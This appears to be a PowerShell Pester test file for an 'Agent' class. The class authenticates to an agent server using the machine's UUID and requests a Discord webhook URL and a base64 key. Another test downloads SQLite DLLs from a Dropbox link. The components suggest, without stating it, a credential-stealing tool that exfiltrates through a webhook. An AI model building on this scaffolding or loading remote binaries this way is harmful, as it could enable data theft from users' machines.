. (Join-Path -Path $PSScriptRoot -ChildPath "..\..\src\powershell\main.ps1")

$RemoteHost = "127.0.0.1"
$Port = 5555



Describe "Class: Agent" {
    BeforeAll {
        $agent = [Agent]::new($RemoteHost, $Port, $false)
    }

    BeforeEach {
        Write-Host "`n========================= CONNECT TO THE AGENT SERVER ========================="
        $agent.Connect()
    }

    It "Ping method should not throw exception" {
        $agent.Ping() | Should -Not -Be throw
    }

    It "Authenticate method should return `"$true`" bool" {
        $agent.Authenticate((Get-SystemUuid)) | Should -Be $true
    }

    Context "Test `"RequestJson`" method" {
        BeforeAll {
            $jsonBody = @{
                requests = @(
                    "discord_webhook_url",
                    "base64_key"
                )
            }
        }

        BeforeEach {
            $agent.Authenticate("")
        }

        It "Baase64 key should be 44 length" {
        }

    }

    AfterEach {
        $agent.Disconnect()
        Write-Host "========================= DISCONNECT FROM THE AGENT SERVER ========================="
    }

}


Describe "Install-SqliteDlls" {
    BeforeAll {
        $fileUrl = "https://www.dropbox.com/scl/fi/zbtzdu4tkclcxjfhn1vmd/sqlite-netFx46-static-binary-x64-2015-1.0.117.0.zip?rlkey=j9h75eujv7ee2026vna0yc2sd&dl=1"
        $filePath = Join-Path -Path $TestDrive -ChildPath ""
        Install-SqliteDlls -FileUrl $fileUrl -Directory $TestDrive "System.Data.SQLite.dll"
    }

    It "Sqlite dll is exits" {
        (Test-Path -Path $filePath) | Should -Be $true
    }
}


# BeforeEach は Context の It の前に実行される
